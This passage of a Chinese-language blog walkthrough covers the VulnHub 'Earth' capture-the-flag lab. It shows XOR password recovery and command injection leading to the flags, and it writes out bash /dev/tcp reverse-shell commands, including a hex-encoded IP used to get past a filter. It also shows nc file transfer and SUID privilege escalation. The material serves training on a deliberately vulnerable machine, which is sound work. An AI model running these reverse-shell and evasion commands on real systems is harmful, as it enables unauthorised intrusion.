+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 将参考文本转为2进制字节</span>
+</span></span><span style="display:flex;"><span>data2 <span style="color:#ff6ac1">=</span> text_data<span style="color:#ff6ac1">.</span>encode(<span style="color:#5af78e">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 对 data2 进行循环填充，使其长度与 data1 一致</span>
+</span></span><span style="display:flex;"><span>data2_padded <span style="color:#ff6ac1">=</span> (data2 <span style="color:#ff6ac1">*</span> (<span style="color:#ff5c57">len</span>(data1) <span style="color:#ff6ac1">//</span> <span style="color:#ff5c57">len</span>(data2) <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">1</span>))[:<span style="color:#ff5c57">len</span>(data1)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 逐字节异或</span>
+</span></span><span style="display:flex;"><span>result <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytes</span>([a <span style="color:#ff6ac1">^</span> b <span style="color:#ff6ac1">for</span> a, b <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">zip</span>(data1, data2_padded)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 输出异或结果（十六进制形式）</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;XOR Result (Hex):&#34;</span>, result<span style="color:#ff6ac1">.</span>hex())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 尝试将异或结果解码为文本（UTF-8）</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">try</span>:
+</span></span><span style="display:flex;"><span>    decoded_text <span style="color:#ff6ac1">=</span> result<span style="color:#ff6ac1">.</span>decode(<span style="color:#5af78e">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;Decoded Text:&#34;</span>, decoded_text)
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">except</span> UnicodeDecodeError:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;Result is not readable as UTF-8 text.&#34;</span>)</span></span></code></pre></div><p>运行python脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~/Desktop/vulnhub/earth<span style="color:#ff6ac1">]</span>
+</span></span><span style="display:flex;"><span>└─$ python xor.py                           
+</span></span><span style="display:flex;"><span>XOR Result <span style="color:#ff6ac1">(</span>Hex<span style="color:#ff6ac1">)</span>: 6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174
+</span></span><span style="display:flex;"><span>Decoded Text: earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span></span></code></pre></div><ul>
+<li>输出为重复的<code>earthclimatechangebad4humans</code>，推测为管理员密码</li>
+</ul>
+<h2 id="22-获取user_flag">2.2 获取user_flag<a class="anchor" href="#22-%e8%8e%b7%e5%8f%96user_flag">#</a></h2>
+<p>使用账户名<code>terra</code>，以及密码<code>earthclimatechangebad4humans</code>，进行登录。
+见到CLI command界面，运行id，得到<code>Command output: uid=48(apache) gid=48(apache) groups=48(apache)</code>，发现这里是一个command injection的命令窗口</p>
+<p>尝试直接查找flag，<code>find / -name &quot;*flag*&quot;</code>，结果有<code>/var/earth_web/user_flag.txt</code>
+查看此文件，发现结果</p>
+<pre tabindex="0"><code>Command output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d] </code></pre><p>获得了普通用户权限的flag</p>
+<h2 id="23-反弹shell">2.3 反弹shell<a class="anchor" href="#23-%e5%8f%8d%e5%bc%b9shell">#</a></h2>
+<p>尝试直接使用反弹shell，在kali中监听<code>nc -lvnp 7777</code>，接着命令注入<code>bash -i &gt;&amp; /dev/tcp/192.168.174.131/7777 0&gt;&amp;1</code>，但被拦截
+尝试将IP转换为十六进制格式，创建一个python脚本，</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(socket<span style="color:#ff6ac1">.</span>inet_aton(<span style="color:#5af78e">&#39;192.168.203.129&#39;</span>)<span style="color:#ff6ac1">.</span>hex()<span style="color:#ff6ac1">.</span>upper())</span></span></code></pre></div><ul>
+<li><code>inet_aton</code>(即Internet Address to Network format，将互联网地址转换为网络字节序)，4字节原始二进制数据，得到的是一个<code>bytes</code>对象<code>b'\xc0\xa8\...\...</code></li>
+<li><code>.hex()</code>将二进制字节转换为十六进制</li>
+<li><code>.upper()</code>将所有字母转换成大写
+得到<code>C0A8AE83</code>，在前面加上0x，符合十六进制整数规范
+注入<code>bash -i &gt;&amp; /dev/tcp/0xC0A8AE83/7777 0&gt;&amp;1</code>，成功反弹。</li>
+</ul>
+<h1 id="三提权">三、提权<a class="anchor" href="#%e4%b8%89%e6%8f%90%e6%9d%83">#</a></h1>
+<h2 id="31-查找可提权命令">3.1 查找可提权命令<a class="anchor" href="#31-%e6%9f%a5%e6%89%be%e5%8f%af%e6%8f%90%e6%9d%83%e5%91%bd%e4%bb%a4">#</a></h2>
+<p>找具有SUID权限的文件
+<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，结果中有<code>/usr/bin/reset_root</code>文件</p>
+<h2 id="32-reset_root分析">3.2 reset_root分析<a class="anchor" href="#32-reset_root%e5%88%86%e6%9e%90">#</a></h2>
+<p>启动<code>reset_root</code>文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>bash-5.1$ reset_root
+</span></span><span style="display:flex;"><span>reset_root
+</span></span><span style="display:flex;"><span>CHECKING IF RESET TRIGGERS PRESENT...
+</span></span><span style="display:flex;"><span>RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.</span></span></code></pre></div><p>失败，所有触发器都不存在</p>
+<p>本地没有调试命令，使用nc传送到本地调试</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#78787e"># kali，输出重定向，将接收到的网络数据保存到名为reset_root的新文件中</span>
+</span></span><span style="display:flex;"><span>nc -lnvp <span style="color:#ff9f43">7777</span> &gt; reset_root
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 反弹来的靶机的shell中，输入重定向，将靶机原本有的reset_root文件内容喂给nc，通过网络发出去</span>
+</span></span><span style="display:flex;"><span>nc 192.168.203.129 <span style="color:#ff9f43">7777</span> &lt; /usr/bin/reset_root</span></span></code></pre></div><p>赋予执行权限，使用strace调试，<code>sudo strace ./reset_root</code>，发现没有如下文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>chmod +x ./reset_root
+</span></span><span style="display:flex;"><span>access<span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#34;/dev/shm/kHgTFI5G&#34;</span>, F_OK<span style="color:#ff6ac1">)</span>       <span style="color:#ff6ac1">=</span> -1 ENOENT <span style="color:#ff6ac1">(</span>No such file or directory<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#34;/dev/shm/Zw7bV9U5&#34;</span>, F_OK<span style="color:#ff6ac1">)</span>       <span style="color:#ff6ac1">=</span> -1 ENOENT <span style="color:#ff6ac1">(</span>No such file or directory<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#34;/tmp/kcM0Wewe&#34;</span>, F_OK<span style="color:#ff6ac1">)</span>           <span style="color:#ff6ac1">=</span> -1 ENOENT <span style="color:#ff6ac1">(</span>No such file or directory<span style="color:#ff6ac1">)</span></span></span></code></pre></div><p>这是程序在询问内核，这个文件是否存在，内核回答不存在，由于这三个文件都不存在，程序走到了<code>RESET FAILED</code>的逻辑</p>
+<p>于是靶机上创建这三个文件，再次运行reset_root</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>touch /dev/shm/kHgTFI5G
+</span></span><span style="display:flex;"><span>touch /dev/shm/Zw7bV9U5
+</span></span><span style="display:flex;"><span>touch /tmp/kcM0Wewe</span></span></code></pre></div><p>得到如下信息</p>
+<pre tabindex="0"><code>CHECKING IF RESET TRIGGERS PRESENT...
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth</code></pre><p>得到了root密码<code>Earth</code>，使用<code>su root</code>切换为root模式，再<code>cd /root</code>，<code>cat root_flag.txt</code>，得到最终flag<code>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</code></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+<a class="flex align-center" href="https://github.com/vnccer/vnccer.github.io/commit/090b0eea1800094030cbc586f5bb3d0540bc1cd4" title='Last modified by vnccer | March 11, 2026' target="_blank" rel="noopener">
+    <img src="/icons/calendar.svg" class="book-icon" alt="Calendar" />
+    <span>March 11, 2026</span>
+  </a>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Noob: 1</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/" class="flex align-center">
+        <span>Empire lupinone</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+  <div class="book-copyright flex justify-center">
+    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
+  </div>
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#一信息收集">一、信息收集</a>
+      <ul>
+        <li><a href="#11-端口信息收集">1.1 端口信息收集</a></li>
+        <li><a href="#12-web信息收集">1.2 Web信息收集</a>
+          <ul>
+            <li><a href="#121-域名earthlocal">1.2.1 域名earth.local</a></li>
+            <li><a href="#122-子域名terratestearthlocal">1.2.2 子域名terratest.earth.local</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#二漏洞攻击">二、漏洞攻击</a>
+      <ul>
+        <li><a href="#21-密码破解">2.1 密码破解</a></li>
+        <li><a href="#22-获取user_flag">2.2 获取user_flag</a></li>
+        <li><a href="#23-反弹shell">2.3 反弹shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#三提权">三、提权</a>
+      <ul>
+        <li><a href="#31-查找可提权命令">3.1 查找可提权命令</a></li>
+        <li><a href="#32-reset_root分析">3.2 reset_root分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
